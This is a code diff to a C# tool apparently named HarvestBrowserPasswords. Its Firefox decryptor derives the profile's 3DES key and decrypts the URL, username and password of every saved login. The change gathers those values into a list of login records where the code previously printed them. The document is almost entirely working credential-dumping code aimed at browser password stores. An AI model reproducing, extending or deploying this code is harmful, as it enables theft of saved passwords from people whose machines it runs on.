@@ -1,6 +1,7 @@
 ﻿using System;
 using System.IO;
 using System.Collections;
+using System.Collections.Generic;
 using System.Collections.Specialized;
 using System.Linq;
 using System.Text;
@@ -12,20 +13,17 @@ namespace HarvestBrowserPasswords
 {
     public class FirefoxDatabaseDecryptor
     {
-        public string ProfileDir               { get; set; }
-        public string Key4dbpath               { get; set; }
-        public string FormSubmitUrl            { get; set; }
-        public string Username                 { get; set; }
-        public string Password                 { get; set; }
-        public byte[] GlobalSalt               { get; set; }
-        public byte[] EntrySaltPasswordCheck   { get; set; }
-        public byte[] EntrySalt3DESKey         { get; set; }
-        public byte[] CipherTextPasswordCheck  { get; set; }
-        public byte[] CipherText3DESKey        { get; set; }
-        public string MasterPassword           { get; set; }
-        public byte[] DecryptedPasswordCheck   { get; set; }
-        public byte[] Decrypted3DESKey         { get; set; }
-
+        private string ProfileDir               { get; set; }
+        private string Key4dbpath               { get; set; }
+        private byte[] GlobalSalt               { get; set; }
+        private byte[] EntrySaltPasswordCheck   { get; set; }
+        private byte[] EntrySalt3DESKey         { get; set; }
+        private byte[] CipherTextPasswordCheck  { get; set; }
+        private byte[] CipherText3DESKey        { get; set; }
+        private string MasterPassword           { get; set; }
+        private byte[] DecryptedPasswordCheck   { get; set; }
+        private byte[] Decrypted3DESKey         { get; set; }
+        public List<BrowserLoginData> FirefoxLoginDataList { get; set; }
 
         public FirefoxDatabaseDecryptor(string profile, string password)
         {
@@ -53,18 +51,17 @@ namespace HarvestBrowserPasswords
                     //Check for PKCS#7 padding and remove if it exists
                     Decrypted3DESKey = Unpad(Decrypted3DESKey);
 
+                    FirefoxLoginDataList = new List<BrowserLoginData>();
+
                     Console.ForegroundColor = ConsoleColor.Yellow;
                     foreach (FirefoxLoginsJSON.Login login in JSONLogins.Logins)
-                    {
-                        
+                    {                 
                         try
                         {
                             if (!(login.FormSubmitURL.Equals(null)))
                             {
                                 byte[] usernameBytes = Convert.FromBase64String(login.EncryptedUsername);
                                 byte[] passwordBytes = Convert.FromBase64String(login.EncryptedPassword);
-                                Console.WriteLine($"URL                     {login.FormSubmitURL}");
-                                FormSubmitUrl = login.FormSubmitURL;
 
                                 ASN1 usernameASN1 = new ASN1(usernameBytes);
 
@@ -77,11 +74,11 @@ namespace HarvestBrowserPasswords
                                 byte[] passwordIV = passwordASN1.RootSequence.Sequences[0].Sequences[0].OctetStrings[0];
                                 byte[] passwordEncrypted = passwordASN1.RootSequence.Sequences[0].Sequences[0].OctetStrings[1];
 
-                                Username = Encoding.UTF8.GetString(Unpad(Decrypt3DESLogins(usernameEncrypted, usernameIV, Decrypted3DESKey)));
-                                Password = Encoding.UTF8.GetString(Unpad(Decrypt3DESLogins(passwordEncrypted, passwordIV, Decrypted3DESKey)));
+                                string decryptedUsername = Encoding.UTF8.GetString(Unpad(Decrypt3DESLogins(usernameEncrypted, usernameIV, Decrypted3DESKey)));
+                                string decryptedPassword = Encoding.UTF8.GetString(Unpad(Decrypt3DESLogins(passwordEncrypted, passwordIV, Decrypted3DESKey)));
 
-                                Console.WriteLine($"Decrypted Username      {Username}");
-                                Console.WriteLine($"Decrypted Password      {Password}");
+                                BrowserLoginData loginData = new BrowserLoginData(login.FormSubmitURL, decryptedUsername, decryptedPassword, "Firefox");
+                                FirefoxLoginDataList.Add(loginData);
                             }
                         }
                         catch (NullReferenceException)
@@ -166,7 +163,7 @@ namespace HarvestBrowserPasswords
         {
             //https://github[.]com/lclevy/firepwd/blob/master/mozilla_pbe.pdf
 
-            byte[] password = Encoding.ASCII.GetBytes(masterPassword);
+            byte[] password = Encoding.UTF8.GetBytes(masterPassword);
             byte[] hashedPassword;
             byte[] keyFirstHalf;
             byte[] keySecondHalf;
